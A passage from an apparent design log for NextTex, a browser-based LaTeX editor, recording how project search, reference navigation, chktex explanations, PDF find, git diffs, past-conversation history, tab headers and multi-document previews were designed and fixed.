
`Cmd-Shift-F` is the same question asked of every file, which is the
convention every editor with both has settled on, and it opens a panel in the
rail under Files. Under Files rather than in a window of its own, because it
answers the same question the filter row above it answers and answers it about
the contents rather than the names, and because a modal find panel over the
document hides the thing being searched.

Results are grouped by file, not listed flat. The question a writer asks of a
project search is "which files" at least as often as "which lines", and forty
hits in one file listed flat answers neither. Each row carries the line
number, the line, and the match marked in it with the same colour the editor's
own find uses: two searches in one app that highlight differently read as two
features.

The search runs over what the editor has, not only over what is on disk. The
projection to disk is on a debounce, so a search that read files alone would
not find the sentence typed a moment ago, and a search that cannot find what
is on screen reads as broken rather than as stale. The documents that are open
are the ones somebody is typing in, so those are taken live and everything
else comes off disk.

Replacing everywhere is behind a confirmation, and the confirmation says where
the work goes if it was a mistake: each file that changes keeps a version in
its history. That is the whole undo. A replace across a thesis is the one edit
Mod-Z cannot take back, because the change is in twelve files and eleven of
them are not open, so the sentence has to be in front of the writer at the
moment they decide rather than in a document they would have to go and find.

Two things about the query are worth writing down. A plain query is taken
literally, so `eq.flux` does not match `eq:flux`: a full stop is the commonest
character in prose and a writer who has not asked for a pattern has not asked
for one. And the replacement is inserted as it was typed rather than read for
escapes, because a LaTeX writer's replacement is mostly backslashes, and
`re.sub` handed `\citep` as a replacement string raises "bad escape". With
the pattern switch on, `\1` means the first group again, which is what was
asked for.

### The three commands that hold a thesis together, and where they went

A long document is a graph: `\ref` points at a `\label` in another chapter,
`\input` points at a file, `\cite` points at an entry in a bibliography. None
of the three went anywhere. Finding what `\ref{eq:flux}` pointed at meant
remembering which chapter held the equation and searching that chapter for the
label, and checking a citation meant opening the `.bib` and reading it.

The project's symbol table has known where every label, every `.tex` and every
bibliography entry lives since the completion list was built on it, and the
completion list was the only thing that read it. So this is a second reader
rather than a new mechanism.

Hover says where a reference goes: the file and the line for a `\ref`, the
resolved filename for an `\input`, and the author, year and title for a
`\cite`. It reuses the box the equation preview draws in, because the two
never overlap: a `\ref` is never inside an equation. Ctrl-click, or Cmd-click
on a Mac, follows it. The hover carries that sentence as well as the answer,
because a modifier-click is not a gesture anybody finds by looking at a screen
and the hover is the only place it can be mentioned at the moment somebody
would use it.

A citation is deliberately hover-only. It names a paper, not a place in this
project, so there is nothing to open and offering the gesture would be a
promise the app cannot keep. A `\ref` whose label does not exist is the other
side of the same rule: the click is swallowed rather than falling through to
whatever a plain click would have done, because a click aimed at a reference
that quietly does something else reads as the editor misbehaving, and the
hover has already said the label is missing.

The command families are spelled out rather than matched by prefix. `\cite`,
`\citep`, `\parencite` and a dozen more are citations; `\citation` is not,
and `\reflectbox` is not a reference, and both of those match a prefix rule.
`\cite[p. 3]{alpha,beta}` is read past its optional argument and answers for
whichever of its two keys the pointer is on.

### chktex was the one thing in the drawer still speaking TeX

The error drawer's whole argument is that a writer should not have to read
TeX's own diagnostics, and every LaTeX error in it comes with a title, a
sentence saying what actually went wrong, and what to type instead. chktex's
warnings sat in the same list saying things like "Interword spacing (`\ ')
should perhaps be used", which is correct, and useless to somebody who has
never heard of interword spacing. The route was already parsing the warning
number chktex prints and throwing it away.

Twenty-three warnings have English now, which is every one the probe corpus
could provoke under the settings this project uses; about a dozen numbers
were never provoked and may be reachable with input nobody tried. Each explanation says what the
reader will see on the page, because that is the part a writer can judge: not
"intersentence spacing should perhaps be used" but "a sentence ending in a
capital runs into the next one, because TeX read the full stop as an
abbreviation".

The risk in a table keyed on another tool's numbers is that one number is
wrong and the drawer then explains, confidently, a warning the writer is not
looking at. So every rule carries the fragment of LaTeX that produces it, and
the test runs chktex over all twenty-three and asserts each number comes back.
A chktex that renumbers its warnings fails the suite. The same test reads the
muted list out of `.chktexrc` and refuses an explanation for anything muted,
and checks that nothing the triggers fire is left without one.

### The page could be selected and never searched

The text layer that makes a page selectable has carried every word on it since
the preview was built, and there was no way to ask it anything: reading a
two-hundred-page thesis for one sentence meant scrolling. `Cmd-F` with the
preview holding the keyboard, which it does after a click on a page, opens a
find bar above it. In the editor the same key is the editor's own find, which
searches the source and stays exactly what it was.

The bar is above the page rather than in the footer. The editor's own find sits
at the top of its pane, so the two match, and the footer is a 26px strip that
already drops controls at three widths and could not have held an input at any
of them. It is unmounted when closed, so nothing is drawn for a reader who
never uses it.

The text is extracted once per build and kept. A walk of a three-hundred-page
document's text content is a few hundred milliseconds once, and would be that
per keystroke without the cache. Matching is plain and case-insensitive,
because the project search and the editor's find both are by default, and
three finds in one app that disagree about what a query means read as three
features. The current match takes the editor's selected-match colour and the
page scrolls to it; a match that straddles two of pdf.js's text items, where a
line breaks mid-word or the font changes, is counted and scrolled to but has no
single span to mark, which is accepted rather than worked around.

### "See what changed" showed the name of what changed

"See what changed" has been one of the four git buttons since the README named
them, and what it showed was a status letter and a path. In the history, "Show
what's gone" shades, in place, the lines an old version had that the file no
longer does, and that is a real diff and a deliberate design, recorded above:
marked in the paragraph it happened to rather than shown in a pane. What it
could never show was what arrived, and two versions could not be compared with
each other at all.

The patch is the other reading of the same comparison, and it is drawn the way
the agent's edit chip has always drawn one: a monospace block, additions
washed with the ok colour and removals with the error colour, capped and
scrolling. That renderer is now one component rather than three, because
three renderers of the same text would be three slightly different colours for
"added". Its one piece of arithmetic, where the hunks start, had been a fixed
count of header lines, which is right for what `jsdiff` writes and wrong for
what git writes, so it looks for the first `@@` instead and keeps a patch with
no hunk whole, since "Binary files differ" is one line and should be read.

In the git panel the chevron beside a changed file opens its patch, and the
row itself still opens the file; the patch is fetched when the chevron opens
rather than for every row when the panel draws, because a `git diff` per file
after every build is not a cost a list most people only read should pay. The
diff is taken against the last commit rather than against the index, because
the panel has no notion of the index and a writer who has never typed `git
add` should not be shown an empty patch for a file the panel itself says is
modified; a file git has never seen gets a patch built here, every line an
addition, which is what it is.

In the history, "Show what changed" sits beside "Show what's gone" on the
banner and draws the patch from the version on screen to the file as it
stands, under the banner. "Compare", on any other version of the same file
while one is on screen, draws the patch between the two, older on the left
whichever was clicked, so a patch always reads forwards in time. The shading
stays: reading a change in place and reading a diff are different acts, and
the banner now offers both.

### The last fifty conversations were kept, and none of them could be reached

"New conversation" has always filed the old one away under a timestamp rather
than deleting it, because the transcript is the record of what an assistant
did to somebody's dissertation. The server kept the last fifty, returned each
one's name, and the browser threw the name away; no route listed them, so a
past conversation was reachable only by finding the file on disk.

A clock beside "New conversation" opens the list, newest first, each titled
with the first thing the writer asked, because fifty timestamps is not a list
anybody can choose from. Opening one draws it in the panel, read-only, and
Back returns to the live conversation exactly as it was: the store's own
conversation is never touched.

Read-only is drawn with its own renderers, and that is the whole design
decision. An edit chip in the live panel has an Undo that writes to a file,
and a permission card has Allow and Deny that answer an id the agent is
waiting on. A conversation from last week has neither an agent waiting nor a
file in the state it was in, so every control on it would be a promise the
app cannot keep. What is shown is what was said and what was done: the prose,
a line per tool call, a line per edit with its counts, a line per card with
how it was answered.

A very long past conversation shows its end, through the same tail the live
transcript is read through. That is a limit, and it is written here rather
than fixed, because the case is a conversation longer than four megabytes of
record and the fix is a paging route nobody has needed.

### The git panel's buttons did not fit, and the panel could not be put away

The card offering to keep versions of a project put three buttons in one
row: "Keep versions here", "Back up to GitHub instead" and "Not now". The
rail is 240px wide by default and drags down to 180, the row did not wrap
and the labels were not told not to, so each folded inside its own fixed
height box and the card showed the top half of every word. The third
button was a different size and weight from the other two as well, so the
row read as three separate decisions rather than one.

Two rows now, and the two typographies the panel already had: the primary
is full width, as "Commit and push" is, and the second row holds the quiet
controls in the idiom of the footer's own "Back up" and "Pull". "Instead"
goes; the position under the primary says it. Every button in the card
and in the wizard is nowrap, so a label can never again fold inside a box
that cannot grow, and a test seeds the rail at its 180px minimum and
checks that every label in both cards and the wizard occupies one line.

The panel was also the one thing in the rail that could not fold, and the
first-run card is the tallest thing the rail holds. It has the 26px header
the other panels have, with the count of changed files where Files and
Sections carry their counts, and the open state is held by the app so that
it is remembered per project alongside the rest. Open is the default, so
the first thing a new project shows is the offer to keep versions; what is
stored is merged over the default key by key, so a rail remembered from
before the panel could fold comes back with it open rather than silently
closed.

With a header over it, the empty state had to be looked at. The footer has
had a way back to the GitHub wizard since "Not now" was found to have no
later, but the footer only draws for a project that has a repository, so
on a project without one the dismissal was permanent: the route to init was
gone for the life of the project short of clearing the browser's storage.
That state now draws one quiet line with the two controls the card
offered.

## 31. Report a problem, at the foot of the project list

The projects screen's footer carried the update affordance and nothing
else, and the README's advice to somebody with a problem was to send the
last block of `update.log`. That asked a writer to find a file, read it for
the access token it might contain, and describe by hand which commit they
were on, which tools the install had found and what the server had logged.
Every one of those would otherwise have come back as a question on the
issue.

**Where it sits.** A `quiet t-micro` control reading *Report a problem*,
after a hairline, on every quiet line the footer draws: up to date, an
update waiting, the docs-only line, the unrestarted line, the unchecked
line, the resting line, and the line a folder that is not a checkout gets
(which used to draw nothing at all). It is also on the error card, since
"could not reach the repository" is a moment to report from. It is never
on the update card or the progress card: while an update runs there is
nothing to report yet, and a failed update has its own card with the log in
it. The footer's first draft put it only on the resting line, which is
reached only after an unasked check fails, so a healthy install would never
have seen it.

**What a press does.** It asks `POST /api/report` for the text, with the
interface's own record of its last errors and the browser's user agent, and
tries the clipboard while the click is still warm; then it draws a card.
The card says one of two sentences, *The report is on your clipboard.* or
*Copy the report, then open the issue.*, and offers **Open a new issue**, a
link to the form on GitHub with the platform, service, Python and commit
pair already filled in; **Copy**, on its own press; **Show the report**;
and **Close**.

**Why a card rather than a page that opens itself.** Two browsers decide
it. A `window.open` after the fetch has returned is a popup with no click
behind it, which Safari and Firefox block, and a clipboard write after an
`await` is refused in Safari; a link is never blocked and a Copy button on
its own gesture is honoured everywhere. Chrome allows the write within the
moment of the click, so there one press does everything. The other reason
is the rule the whole thing turns on: the writer sees the report before it
goes anywhere. The card says in one line what the text holds and asks them
to read it, because it names their machine, and the text is behind a toggle
because eighty lines of log on the first screen of a session is not what
anybody came for.

**What the page records.** Nothing on the client side recorded anything
before this. `errors.ts` keeps a ring of twenty: uncaught errors and
unhandled rejections from the window, what the error boundary catches, and
every answer of 500 or worse from the server, whose message carries the
eight-hex reference the server logged under. That reference is the join
between what the writer saw and the line the report quotes from the log.
Nothing here calls `preventDefault`, so the console still shows all of it.

## 32. Six things the writer asked for in one message

A batch rather than a review: the spelling menu on light pages, inverse
search on headings, column selection, the tab strips and their shortcuts,
an emphasis setting, and Tab for completions. Each subsection records what
was observed, what the cause was, and what was decided against.

### Tab takes the completion

The completion keymap binds Enter alone. A writer whose hands know Tab
from every other editor pressed it with the list open and got two spaces
in front of the half-typed command, list still showing. `acceptCompletion`
is now bound to Tab ahead of `indentWithTab`; it returns false when no
list is open or nothing in it is selected, so a Tab typed anywhere else
still indents. Nothing about Enter changed.

One thing the test had to learn: CodeMirror refuses to accept a list
younger than 75 ms, and that clock restarts each time the list is refilled,
which the last keystroke's query does after the list is already on screen.
A person is slower than that. The test waits, with the reason beside it,
because nothing in the DOM says the clock has run.

### Emphasis is the other half of highlighting

The writer asked for bolding to be its own setting, so that highlighting is
two controls: colour (subtle or colour) and weight (bold commands or plain).
Every command weight in the pane already resolved through one variable,
`--nx-weight-strong`, derived on `.cm-editor` from the prose weight and the
page's lift, so plain is one override on the editor host's class,
`--nx-weight-strong: var(--nx-weight)`, and no second set of rules. The
subtle look has the same shape, an absence rather than a reproduction.

What plain could not be is only an absence. In the subtle look weight was
the one thing telling `\section` from a word, and in the colour look it was
what `\textbf`, `\label`, `\centering` and every other command outside the
five families still had. So the writer's second instruction, that a plain
command outside the families needs a fallback colour, is what makes the
setting usable rather than a way to make the source unreadable. The colour
is `--syn-command`, a low-chroma slate at the families' lightness on each
palette: quiet enough to say "a command" and never "which kind", which is
what a sixth hue would have said. `contrast.test.ts` holds it to the same
4:1 floor against the page and the same fourteen L* from the prose as the
families, and deliberately *below* their chroma floor, because low chroma is
the point, with a floor of its own so it does not become a grey that reads
as a disabled word. The HighlightStyle's keyword colour became a variable
with the ink as its fallback so the pane can hand it that colour; the
family rules still win over it for the five families because they colour
the inner span.

The browser tests measure the innermost span, which is a detail worth
writing down: a family mark and the token inside it are two nested spans
over the same characters, and the weight and colour that show are the inner
one's, so a computed style read off the mark says nothing.

### The spelling menu is furniture after all

§28 recorded, under "One thing looking found and left alone", that the
spelling menu and the selection verb row were the two things floating over
the page that deliberately followed the page: a dark card dropped on a lit
page would read as a hole punched in it. The writer's report was the
opposite, and it was about every light ground at once: the menu blended
into the page, the hovered and focused row could not be seen, the text
read faint, and it did not look like the app's other menus. On a white
page the argument had inverted itself. `--surface-2` is one step from the
paper there, so the pale card was the hole, and a menu that is the only
pale card in an app whose every other menu is dark furniture reads as
unfinished rather than as considered.

Both cards are furniture now, with the downloads menu's recipe. Three
things came with the change (the first of which the visual overhaul has
since undone with the furniture itself: a card over the editor now takes
the shell's palette through the kit's `nx-theme-light` or `nx-theme-dark`
class, which reaches the same case by a different route):

- **The furniture selector is the bare class.** It was keyed on the light
  root, `:root[data-theme="light"] .nx-furniture`, and that missed one
  case: a card inside an editor host carrying `.nx-theme-light` under a
  dark root, a white page in a dark shell. The root did not match, the
  host's class won, and the menu came out pale on pale. Under a dark root
  the bare class changes nothing. `contrast.test.ts` measures the block by
  its selectors, so the list there moved with it.
- **The current row paints itself.** The first item is focused by script
  the moment the menu opens, after a mouse gesture, and no browser paints
  that as visible focus. So the row is lit on `:focus` rather than only
  `:focus-visible`, in `--hint-wash`, the wash the completion list already
  uses for the same reason. There is no `:hover` beside it: the pointer
  moves the same focus, so hover and the keyboard row are one highlight,
  which they were not the moment the menu opened under a pointer resting
  on its second row. Only a pointer that moved, because Chrome replays a
  move at the resting position after layout settles.
- **It opens upwards at the foot of the pane.** The host clips, and a menu
  opened on the last visible line put its one useful item below the pane.
  Measured after mount rather than guessed.

Three bugs the browser tests turned up while they were being written, all
fixed in the same commit:

- **Every re-render put focus back on the first row.** The menu's `ref`
  was an inline arrow, which is a new function on every render, and React
  calls a new ref with the node again. The word list arriving, or the
  cursor readout changing, re-focused the first item a beat after an arrow
  key had moved to the second. The ref is a callback keyed on the offer.
- **Spell checking did not come back after a reload.** The setting
  survived and the checker did not: every fresh editor state starts with
  an empty spelling compartment, and after a reload the setting and the
  word list had both settled before the file finished opening, so nothing
  re-ran the effect that fills it. The sheet said on, the page marked
  nothing, and only off-and-on brought the underlines back. The checker
  is now re-applied after every buffer swap, from the same function the
  effect uses. The screenshot spec for the underlines had been failing on
  exactly this for some time, unnoticed because it is a look and not a
  check.
- **The menu opened away from the word at a larger interface size.** The
  pointer position is read in viewport pixels and written as a style
  inside the zoomed shell; at 150% the menu opened half again as far from
  the word as the pointer was. Both routes go through `toShell` now, as
  the tab strip's menu already did.

### A column can be selected

`rectangularSelection()` had been in the editor's extension list for a
year and did nothing. The comment beside the link-following handler even
said why, without noticing it was describing a bug: this editor never set
`EditorState.allowMultipleSelections`, and without that facet every
selection with more than one range is reduced to its main range before it
is drawn, so an Alt-drag collapsed to a single caret and looked like an
ordinary click. The writer asked for column selection to edit tables, and
the whole of the fix is the facet, plus `crosshairCursor()` so that holding
Alt says what the drag is about to do.

Two keyboard routes come with it. `defaultKeymap` already binds
`Ctrl-Alt-Up` and `Ctrl-Alt-Down` (`Cmd-Alt` on a Mac) to add a caret on
the neighbouring row, and the facet brings those to life. GNOME takes that
chord for switching workspaces on many installs, and some window managers
take Alt-drag itself before the browser sees it, so the same two commands
are bound a second time to `Ctrl-Shift-Alt-Up` and `Ctrl-Shift-Alt-Down`,
a chord no desktop and no other CodeMirror binding uses. `Shift-Alt-Up` was
not an option: that is `copyLineUp`. `Escape` runs `simplifySelection`,
which is how a writer gets back to one caret, and the README says so.

One consequence is deliberate: a Ctrl-click that is not on a `\ref` or
`\input` now adds a caret, which is CodeMirror's meaning for it. The link
handler claims the event only over a link, so a reference is the one place
a second caret cannot be put by mouse, and the comment beside it now says
that rather than the opposite.

The browser test drags a column through a four-row table with Alt held and
types once, then does the same with the keyboard chord and takes the
carets away with Escape. It had to wait a beat before that Escape: the
completion source is asked 100 ms after a keystroke, and an Escape inside
that window closes the pending query rather than the carets, which is
CodeMirror's own rule and not one worth changing for a press nobody makes
that fast.

### The preview strip showed three tabs where the header had room for seven

There was no cap anywhere. The strip is `flex-1`, and beside it in the
header sat a `<span className="flex-1" />` put there to push the fold
chevron to the right, and two `flex-1` siblings share the free space
equally, so the strip had half the header and showed three tabs at
96 px. The spacer is gone; the chevron sits at the right because the
strip fills what is left.

What the strip did with the tabs it could not show was the second half of
the report. The source strip had, for a year, counted the tabs scrolled
out of sight and hidden its scrollbar; the preview strip, written as "the
same object", had neither, so the rest scrolled away in silence under a
9 px bar. The two now share `tab-overflow.tsx`: the same measurement, once
per frame; the same hidden bar; a tab that squeezes from 200 px to 72 px
before anything overflows, the way a browser's do, so eight files are
eight names shortened rather than four names and a count; the count when
even that is not room, which lists what it hides rather than only
scrolling to the end, because a count answers "how many" and the writer
wants "which"; a strip that follows the tab in front, its own scroll and
nobody else's, because `scrollIntoView` walks every scrolling ancestor and
a tab brought into the strip must not drag the pane; and, at the writer's
asking, a vertical wheel over either strip that scrolls it sideways,
attached with `passive: false` in an effect because React's `onWheel`
cannot prevent the page under the header from scrolling instead.

Two bugs the shared measurement turned up in its own first run. The old
arithmetic read `offsetLeft` as if it were measured from the strip, and it
is measured from the nearest positioned ancestor; the source strip
happened to sit at the left edge of its positioned wrapper, so it worked
there and reported every preview tab hidden. And an effect keyed on a ref
object alone never looks again, and the preview strip is not drawn at all
for a project with one document, so a listener attached at mount was
attached to nothing.

The preview tabs got the source tabs' right-click menu too, on the tab in
front only and for the same reason, with *Duplicate* left out and
*Download PDF* put in; the download route learned `document`, a registry
key and never a path, and names the file after the document rather than
the project, because a supplementary document sent to a supervisor under
the thesis's name is the wrong attachment. Three menus now share
`menu-keys.ts`, which is the spelling menu's keyboard handler pulled out:
the hidden-tabs list, the preview tab menu, and the document chooser,
which had claimed `role="menu"` without keeping the promise. TRACKER.md's
count of those went from three to two.

Those three menus carried the spelling menu's first bug for one commit:
each focused its first row from an inline `ref`, and a strip that
re-renders on every build tick re-focused the first row while the writer
was arrow-keying down the list. The focus moved into an effect keyed on
the menu opening, which runs once, and a browser test opens the tab menu,
moves to the second row, starts a build behind it and asserts the row is
still the second when the compiling dot appears.

One more: a click in a preview tab's padding folded the pane, because the
header's click handler excused only buttons. It excuses tabs now, which
is the rule the source strip already had.

### Reading and writing modes have a key

The plan for the tab strips offered the writer three shapes of handle for
the fold and fill gestures once tabs took the whole header: the pane's
name as a fixed cell at the left, the whole header with tabs squeezing to
keep a blank run, or the fold chevron alone carrying both gestures. They
chose none, and asked for two keyboard shortcuts that give the window to
the source or the preview and give it back. So the header gestures are
exactly what they were, the preview header whole and the source strip's
blank run, and the shortcuts are the route that is there when the run is
not.

`⌘⌥R` and `⌘⌥E`, in the app's own Mod-Alt space, both free in
CodeMirror's keymap and in the browser's; W was the obvious letter for
writing and is already Close the tab in front. The same key again gives
the layout back, like the second double click, and the layout it gives
back is the one the mode was entered from, agent put away and all, because
the shortcut calls the same `toggleFocus` the double click does. The
browser test opens eight files, measures the blank run at under eight
pixels, and enters writing mode from the keyboard.

### A double-click on a heading lands on its section line

Body text landed on the right word and headings did not, and only on
pages after the first, which is the shape of a bug in the page arithmetic
and was not one: nothing in the click-to-synctex-to-editor path treats
page one differently. Measured with `synctex edit` against a built thesis,
a heading's synctex box runs from the top of its glyphs to its *baseline*,
so the lower part of the glyph box, which is where a pointer aimed at a
big word tends to land, already resolves to the paragraph beneath. Body
text has the same edge and nobody sees it, because a one-line miss inside
a paragraph is repaired by the word search and lands in the same paragraph
anyway.

For a heading the repair was what made it flaky rather than merely off.
The search started from the line synctex named, the paragraph under the
heading, and walked below before above, matching the heading's word
case-insensitively wherever a letter boundary allowed: in the body's first
sentence, which for "Results" or "Methods" very often opens with the
heading's own word; or inside `\label{sec:results}` on the line between,
because a colon is a boundary. The `\section` line was two steps up and
was reached last. Page one looked fine because "Introduction" rarely
recurs in its own first paragraph.

Three things changed, and the browser test that reproduces the report,
a second-page `\section{Results}` followed by its label and a paragraph
opening with "Results", clicked at 85% of the heading span's height, was
red before them and green after:

- **The page is asked at the middle of the span**, not at the pointer.
  The text layer's span is the typeset line, and its vertical middle is
  inside the synctex box for a heading and for a body line alike. The one
  pixel border of `.nx-page` is subtracted at the same time; it was in
  the rectangle and not in the canvas.
- **Keys are not prose.** The search runs on a copy of each line with the
  arguments of `\label`, `\ref`, `\cite`, `\input`, `\includegraphics`
  and their relatives blanked at the same length, and everything after
  an unescaped `%` blanked too, so a column found in the copy is a column
  in the line.
- **The click carries a hint.** Beside the word, the whole span's text and
  whether the span reads as a heading: set at least 15% larger than the
  most common span size on the page, or opening with a section number.
  With the hint the search looks for a `\section`-shaped line first, and
  above before below, since the line synctex named is under the heading;
  the span's other words then break ties between lines that all hold the
  word, so a paragraph and the heading above it are told apart by the
  rest of what the writer clicked on. A heading's number, which is no
  word to search for, stands the nearest heading line in. An unnumbered
  `\paragraph{}` set at body size is missed by both readings and gets
  the ordinary search, which is no worse than before.

The writer also asked, mid-run, that with several documents previewed a
double-click open the source of the one on screen. It did: the preview
already asks synctex about the document under the pointer. The browser
test that says so previews a second document, opens something else in the
editor, and double-clicks the second document's page.


## 33. One document model, and the headers built once

The writer keeps a resume project: one base document and a variation per
job listing, each a root `.tex` with its own PDF, a dozen of them open at
once. That project put a dozen tabs in both pane headers and showed what
was wrong with them, and with the idea underneath them. Their words were
that the click-to-fold and double-click-to-expand behaviour was "janky as
ever" once the header was full of tabs, that the two headers did not react
to the mouse the same way, that the `+` was off centre, that the download
menu offered one PDF where the project had twelve, and that "main" was a
concept they did not need. This section records the run that answered all
of it, in the order the work went.

### There is no main document

`nexttex.toml` carried `main = "main.tex"`, the file tree showed a `main`
badge, the row menu offered *Set as main document*, the first preview tab
could not be closed, and every route that took no document name meant that
one. The backend had already outgrown it: §19 made a project build several
root documents, each with its own scheduler and PDF, and `nexttex/deps.py`
already knew who read what. What remained of "main" was a name for the
document that gets typeset when nobody says which, and the honest name for
that is the one on screen.

So it went. Every root `.tex`, meaning a file with `\documentclass` and
`\begin{document}` of its own that nothing else reads, is a document. The
session's `visible_document` is the tab in front, falling back to the first
on the strip, and `document_for("")` means that; a project with no document
at all, which a new folder is until its template loads, opens with an empty
strip and answers a request for its PDF with a 404 that says so rather than
a 500 from an empty registry. The last document on the strip cannot be
closed, for the reason the main one could not: a preview with nothing in it
has no way to get anything back. Any other can, including the one that used
to be main.

**The preview follows the file being written.** Opening a document brings
its page forward, as before. Opening a chapter brings the document that
reads it, however many parts deep, which is `DependencyGraph.root_of`: it
climbs from the file through every reader to one nobody reads, and a
`\subfile` chapter, standalone by the letter of it, still belongs to its
parent. A file two documents both read, a block of skills both resume
variants `\input`, stays with the document on screen, then with one already
on the strip, then goes to the first by path, so the page never changes
under the writer for a file both show and the answer is the same on every
open. The browser decides what it can from the `owners` map it already had,
and asks `POST /api/projects/{id}/previews` about a `.tex` it cannot place;
the route resolves the root, registers it if it was not on the strip, and
answers with `document`, which is what ends up in front. A fragment nothing
reads gets a 404 and is not asked about again until the graph changes, so
switching between a scratch file and a chapter does not send a request per
switch. A root whose stem collides with a document already on the strip
gets the 409 the `+` menu always got, and the browser shows it as a notice:
the preview staying where it was without a word is exactly the failure a
writer cannot work out the cause of. Following a chapter does not open its
document's own file on the source strip; the writer opened the chapter.

**The strip is viewer state.** It was `previews` in `nexttex.toml`, which
is synced to collaborators on purpose. With the preview following the
editor, one writer changing tabs would have grown the strip on the other's
screen. It is `.nexttex/previews.json` now, per install, like the editor's
own tabs; a toml that still says `main` and `previews` is read once to seed
it, in that order, and the keys are not written back.

**A new document is found when it is made.** The `+` menu and the row menus
learned about a standalone file only when the project was next opened; the
tutorial said NextTex finds documents for you, and it found them once. The
session now re-scans the graph, debounced, after any `files_changed` that
names a `.tex` or is structural.

The row menu lost *Set as main document* and gained *Download PDF* on every
document, on the strip or not; a chapter's row does not offer it, because a
chapter's PDF is its parent's and an item that explains itself by failing
is worse than none. The download route accepts any root's path and, for one
not on the strip, builds it with a scheduler of its own under the project's
queue and throws that away afterwards, so downloading twenty variants does
not put twenty tabs on the strip. The file is named after the document,
never the project.

### The two headers are one object

The source header and the preview header were written a year apart as
"the same object" and had drifted into two. The editor's row had no height
of its own, no rule, no hover and no test id; the preview's hovered as a
whole bar and carried a `border-b` that ran under its active tab, which
defeated the one rule the Editor tab spec (§5) is built on, that the tab in
front opens into the pane below it. Inactive labels were `--ink` on one
side and `--ink-2` on the other; the close buttons were two styles; one
right-click menu had keyboard support and the arrive animation and the
other had neither; the `+` was a text glyph sitting on a baseline in a box
it was never centred in.

There is one `PaneHeader` now and one `TabStrip`, and each pane says only
what its tabs are: `SourceHeader` an open file each with its extension and
error count, `PreviewHeader` a document each with its build dot. The
header carries no bottom border and no hover. The rule under the row is
composed by what sits in it, inactive tabs, the empty run and the trailing
controls, and the tab in front carries none, so it opens into the pane on
both sides. Hover belongs to the things that answer a click: an inactive
tab and the empty run tint to `--surface-3` over 90 ms, the tab in front
does not, because it is already the surface. Both menus share
`menu-keys.ts` and `nx-arrive`, and both focus their first row from an
effect keyed on opening (§32). The `+` is an SVG, two strokes crossing at
the middle of its viewBox, in the same 26 px quiet button the download
icon uses, so it is centred by geometry rather than by font metrics. The
preview strip always draws tabs, one included: the serif "Preview" label
that stood in for a single document is gone, because the tab in front is
the pane's handle and a label is not a handle. Below 900 px the same
header carries the source/preview toggle in its trailing slot and nothing
folds, replacing the separate row the preview had there.

### The tab in front is the header

§"Reading and writing modes" recorded, in the writer's words, that the
fold gesture's target on the source pane was the empty run of the strip,
that it shrank to nothing as tabs filled the strip, and that this was
right. The resume project changed their mind: with a dozen tabs there was
no run left on either pane, and a shortcut is not a gesture. Their words
this time were "if the currently opened tab is clicked either on the
editor or the preview, it collapses and double clicking it expands it".

So the tab in front is a handle, on both panes, as well as the empty run,
which keeps its gesture. A click folds after the 250 ms wait; a
double-click gives the pane the window and a second double-click restores
the layout, as before. The arithmetic is `frontend/src/header-gesture.ts`,
a pure function with the tests, and it has one more case than the old
timer had: a double-click on a tab that is *not* in front is click one
selecting it and click two landing on a tab that now is, and without a
guard the pane folded under a writer who only meant to switch. So each
pane records when a tab was last selected, and a header click within the
window of that selection is the second half of that double-click and is
ignored. The close button is excused everywhere; a click on the edge of a
tab not in front is still only a click on that tab. The keyboard route,
`⌘⌥R` and `⌘⌥E`, stays.

The browser tests say all of this: a click on the tab in front folds the
source and the preview and a double-click gives each the window; a
double-click on a tab not in front selects it and folds nothing; the
shortcut and the tab in front both still work with eight files open; and a
parity test reads both headers' computed styles and asserts the same
height, no rule on the row or on the active tab, the same active
background, and the same tint on the empty run under the pointer.

### The download menu lists every document

The menu offered "Whole project .zip" and one "Typeset page .pdf", which
was the main document's, and the client named the file after the project.
It lists every document now, the ones on the strip first and then the ones
that are not, each by its stem with `.pdf` after it, in a column that
scrolls past twenty. A document not on the strip is built by the route on
the spot and never becomes a tab. The file is named by the server's
`Content-Disposition`, after the document and never the project, from the
rail, from the folded-rail controls, from the row menu, from the preview
tab's menu and from the projects screen alike. The menu keeps the promise
of its role at last, which closes one of the two `role="menu"` gaps
TRACKER.md carried; the agent panel's mode menu, the other one, gets the
same handler in the same commit, with the radio items `menu-keys.ts` now
knows to walk.

*Since the backlog close-out the column is a grid: one row per document
and a chip per format on it, §48. The order of the rows and the naming
of the file are as above.*

## 34. Related tabs close together, and the footer names a version

Two requests arrived in one message. The first was about the tab strips:
closing a preview should close the source files that belong to that
document, and the writer noted that the reverse, a source closing its
preview, could not be automatic "because of the whole parent issue", but
asked for it to be thought out and done if a safe form existed. The
second was a version number, `x.y.z`, for a program that until then was
named by its commit hash. This section records both.

### The footer names the number

The update footer was the one place a writer could read anything about
which NextTex they had, and what it read was a seven character hash in
the restart-needed state and nothing at all otherwise. It now names the
version on its quiet line, *NextTex 1.0.0, up to date*, and when an update
is on offer that reaches the program the headline leads with the number
it would move to, *NextTex 1.1.0 is available. Two new commits change
NextTex.* The commit count stays, because it is what says how much moved;
the number goes first because it is what a writer remembers and compares.
An upstream that carries the same number, or none, adds nothing to the
line, and the docs-only case is unchanged: three commits none of which
change NextTex still get the grey line and never a number, since the
number did not move either. Where the number lives and how it is advanced
is `CLAUDE.md`'s to say; `docs/architecture.md` says how it reaches the
footer.

### Closing a preview closes its files

The request was one sentence: closing a preview closes all related source
files. The word doing the work is *related*, and the answer is the map the
browser already has. The server ships `owners`, every file mapped to the
documents that read it, so that a keystroke can mark the right preview
stale without waiting; inverted over the open tabs, it also says which
files belong to the document that has just gone. `orphanedBy` in
`frontend/src/tabs.ts` closes a tab when the file has owners and none of
them is still on the strip, against the map as it stood *before* the
removal, because the server's answer to a removal no longer mentions the
document that went.

What that rule refuses to close is the point of it. A file another
document on the strip also reads stays: the block of text shared between
two variants of a resume is not taken away by closing one of them. A file
with no owner at all stays too: a scratch file, a figure, a chapter that
was `\input` a moment ago and that the graph, which re-scans a third of a
second after a `.tex` file changes, has not caught up with. Closing what
is not known to belong to anything is how a writer loses their place, and
the cost of leaving a tab open is one click. A `.bib` or a figure that only
the closing document reads is related under this rule and goes with it,
since the map carries those edges too.

Both strips move in one store write. `closeMany` in `App.tsx` is now the
one place a tab is closed, for a single tab, for *the others* and *all*,
and for the files a preview takes with it, and it accepts the preview
fields to write in the same `set`: if the tabs moved first, the effect
that makes the page follow the file would run against a strip that still
had the document on it. The files close only once the server has agreed
to the removal, so the 409 that guards the last document leaves the source
strip exactly as it was, and the closed files go onto the same reopen stack
as any other, so `Mod-Alt-Shift-T` brings the chapter back and the follow
effect brings its document back after it. That effect stands down while a
